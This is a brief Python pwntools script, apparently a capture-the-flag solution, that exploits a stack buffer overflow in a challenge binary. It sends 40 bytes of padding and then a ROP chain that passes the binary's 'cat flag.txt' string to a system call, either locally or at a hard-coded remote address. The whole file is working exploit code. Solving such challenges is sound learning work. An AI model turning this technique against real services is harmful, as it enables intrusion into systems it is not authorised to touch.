from pwn import *
import sys

argc = len(sys.argv)
_bin = "./chall"
context.binary = _bin
if argc >=2 and '-r' in sys.argv[1]:
    p = remote("34.84.136.143", 4001)
else:
    p = process(_bin)
e = ELF(_bin)
rop = ROP(e)

p.recvuntil(">")

rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(p64(next(e.search(b'cat flag.txt')))) # rsi
rop.raw(p64(0x4011fb))

offset = b"A" * 40 

payload = offset + rop.chain()

p.sendline(payload)
print(p.recvall())
